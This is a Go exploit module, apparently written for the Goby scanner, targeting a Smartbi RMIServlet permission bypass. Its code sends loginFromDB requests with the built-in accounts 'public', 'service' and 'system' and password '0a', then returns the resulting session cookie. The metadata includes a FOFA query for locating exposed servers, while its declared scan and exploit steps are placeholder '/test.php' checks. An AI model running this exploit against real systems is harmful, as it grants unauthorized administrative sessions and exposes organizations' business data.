package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Smartbi smartbi/vision/RMIServlet interface permission bypass vulnerability",
    "Description": "<p>Smartbi is an enterprise-level business intelligence application platform. After years of continuous development, it has gathered years of best practice experience in business intelligence and integrated the functional requirements of data analysis and decision support in various industries. Meet end users' big data analysis needs in enterprise-level reports, data visualization analysis, self-service exploration analysis, data mining modeling, AI intelligent analysis, etc.</p><p>The attacker bypasses the vulnerability by exploiting permissions, breaks through the original permission restrictions, and obtains administrator or higher permissions, so as to be able to perform core operations.</p>",
    "Product": "SMARTBI",
    "Homepage": "http://www.smartbi.com.cn/",
    "DisclosureDate": "2023-08-10",
    "PostTime": "2023-08-10",
    "Author": "1691834629@qq.com",
    "FofaQuery": "body=\"gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')\"",
    "GobyQuery": "body=\"gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')\"",
    "Level": "3",
    "Impact": "<p>The attacker bypasses the vulnerability by exploiting permissions, breaks through the original permission restrictions, and obtains administrator or higher permissions, so as to be able to perform core operations.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.smartbi.com.cn/patchinfo\">https://www.smartbi.com.cn/patchinfo</a></p>",
    "References": [
        "https://mp.weixin.qq.com/s/-lAW74Nwc9KwOD6sp_4-AA"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "login",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "Smartbi smartbi/vision/RMIServlet 接口权限绕过漏洞",
            "Product": "SMARTBI",
            "Description": "<p>Smartbi 是企业级商业智能应用平台，已经过多年的持续发展，凝聚了多年的商业智能最佳实践经验，整合了各行业的数据分析和决策支持的功能需求。满足最终用户在企业级报表、数据可视化分析、自助探索分析、数据挖掘建模、AI 智能分析等大数据分析需求。<br></p><p>攻击者通过利用权限绕过漏洞，突破原有权限限制，获得管理员或更高权限，从而能够执行核心操作。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.smartbi.com.cn/patchinfo\" target=\"_blank\">https://www.smartbi.com.cn/patchinfo</a></p>",
            "Impact": "<p>攻击者通过利用权限绕过漏洞，突破原有权限限制，获得管理员或更高权限，从而能够执行核心操作。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Smartbi smartbi/vision/RMIServlet interface permission bypass vulnerability",
            "Product": "SMARTBI",
            "Description": "<p>Smartbi is an enterprise-level business intelligence application platform. After years of continuous development, it has gathered years of best practice experience in business intelligence and integrated the functional requirements of data analysis and decision support in various industries. Meet end users' big data analysis needs in enterprise-level reports, data visualization analysis, self-service exploration analysis, data mining modeling, AI intelligent analysis, etc.</p><p>The attacker bypasses the vulnerability by exploiting permissions, breaks through the original permission restrictions, and obtains administrator or higher permissions, so as to be able to perform core operations.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.smartbi.com.cn/patchinfo\" target=\"_blank\">https://www.smartbi.com.cn/patchinfo</a><br></p>",
            "Impact": "<p>The attacker bypasses the vulnerability by exploiting permissions, breaks through the original permission restrictions, and obtains administrator or higher permissions, so as to be able to perform core operations.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10822"
}`
	sendPayload9Iuslwek := func(hostInfo *httpclient.FixUrl, url, param string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig(url)
		if param != "" {
			cfg = httpclient.NewPostRequestConfig(url)
			cfg.Data = param
		}
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		return resp, err

	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			for _, username := range []string{"public", "service", "system"} {
				resp, err := sendPayload9Iuslwek(hostInfo, `/smartbi/vision/RMIServlet`, "className=UserService&methodName=loginFromDB&params=[\""+username+"\",\"0a\"]")
				if err != nil {
					continue
				}
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `"result":true`) {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType != "login" {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
				return expResult
			}

			for _, username := range []string{"public", "service", "system"} {
				resp, err := sendPayload9Iuslwek(expResult.HostInfo, `/smartbi/vision/RMIServlet`, "className=UserService&methodName=loginFromDB&params=[\""+username+"\",\"0a\"]")
				if err != nil {
					continue
				}
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `"result":true`) {
					expResult.Success = true
					expResult.Output = `Cookie: ` + resp.Cookie
					break
				}
			}
			return expResult
		},
	))
}
